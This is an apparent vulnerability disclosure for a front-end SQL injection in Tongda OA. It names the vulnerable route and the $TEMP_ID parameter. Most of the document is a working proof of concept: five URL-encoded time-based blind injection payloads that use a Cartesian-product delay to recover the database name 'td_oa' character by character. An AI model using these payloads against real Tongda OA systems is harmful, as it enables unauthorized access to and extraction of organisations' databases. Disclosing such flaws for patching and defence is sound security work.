Tongda OA has a front-end SQL injection vulnerability

version:Tongda v2017 version and versions below v11.10

Route: general/wiki/cp/ct/view.php

There is an injected parameter: $TEMP_ID

The code here is very simple. When $TEMP_ID is not empty, the parameters are directly spliced ​​into the SQL statement.

![image](https://github.com/zte12321/cve/assets/153057900/4cce18b1-d530-45bd-8890-d736c9d42128)

2.Payload

We can use Cartesian product blind injection for injection. The following payload can determine that the first character of the database name is t, because it was successfully delayed at 116. The ASCII code 116 also corresponds to the lowercase letter t. By analogy, the database name and any information about the database can be obtained through blind injection.

```
1%20and%20(substr(DATABASE(),1,1))=char(116)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)
```

![image](https://github.com/zte12321/cve/assets/153057900/591b2293-6318-4909-920b-f689ffc89318)

Intercept the second digit of the database through blind injection, and determine the second digit as the letter d through the delay time

POC
```
1%20and%20(substr(DATABASE(),2,1))=char(100)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)
```

![image](https://github.com/zte12321/cve/assets/153057900/59823e05-8a9c-4961-ad65-940a62ff2e61)


The third digit is the character _

```
1%20and%20(substr(DATABASE(),3,1))=char(95)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)
```
![image](https://github.com/zte12321/cve/assets/153057900/74429de0-07d0-40aa-b7f3-97f75814b1c8)

The fourth digit is the character o

```
1%20and%20(substr(DATABASE(),4,1))=char(111)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)
```

![image](https://github.com/zte12321/cve/assets/153057900/d1d7fe59-e694-463f-aeed-ae3dfb73fc1a)

The fifth digit is the character a

```
1%20and%20(substr(DATABASE(),5,1))=char(97)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)
```
![image](https://github.com/zte12321/cve/assets/153057900/3152f262-c62e-477c-9a5c-2cc4f4638232)

Then through blind injection, you can determine that the database name is: td_oa
